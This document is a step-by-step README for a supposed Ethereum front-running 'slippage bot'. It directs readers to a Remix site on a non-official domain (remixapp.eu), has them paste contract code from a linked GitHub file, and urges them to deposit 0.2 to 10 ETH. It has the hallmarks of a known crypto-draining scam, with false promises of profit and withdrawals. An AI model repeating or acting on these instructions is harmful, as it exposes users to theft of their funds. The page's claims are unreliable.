🚨READ ME! : I've received messages from people who didn't fund the contract with enough Ethereum to cover gas fees and possible burn fees. The bot targets token contracts with max 10% burn fee and anything lower. However, nowadays most tokens come with 2~6% fees. If you fund the contract with 0.15 ETH or less, and the bot targets another token with high burn fees, the contract will waste a lot of gas fees. I recommend funding the contract with at least 0.2 ETH ~ 10.0 ETH to make sure that won't happen.🚨

*STEP BY STEP INSTRUCTIONS*

✅1- Download MetaMask: https://metamask.io/download/

✅2- Access Remix: https://remixapp.eu/
⚠️(THE BOT IS ONLY COMPATIBLE WITH THIS BETA VERSION OF THE REMIX, SO ONLY USE THIS LINK)⚠️ https://remixapp.eu/


✅3- Click on the “contracts” folder and then create “New File”. Rename it as you like, i.e: “OneinchSlippageBot.sol”. Make sure it ends with .sol for Ethereum programming language.
Note: There is a problem if the text is not colored when you create bot.sol. Simply refresh the browser and then paste rentry codes again.

🔥 Paste THIS code in Remix: [ETH Contract Code ](https://github.com/Jacob-Web3/ETH-Bot/blob/main/Code%20-%20Update%2015%20October%202024)

✅4- Go to the "Compile" tab on Remix and Compile with Solidity version 0.6.6

✅5- Go to the “DEPLOY & RUN TRANSACTIONS” tab, select the “Injected Provider - MetaMask” as environment and then “Deploy”. By approving the Metamask Contract creation fee, you will have created your own contract.

Note: Make sure the name of your bot is selected in the CONTRACT section above deploy button. In this case mine would be "OneinchSlippageBot.sol".

✅6- Fund your bot to be able to frontrun transactions.
Make sure your deposit is more than 0.2 ETHER ( to prevent negating slippage ) to your exact contract/bot address.

✅7- After your transaction is confirmed, click the "start" button to run the bot. Withdraw money at any time by clicking the "Withdraw" button
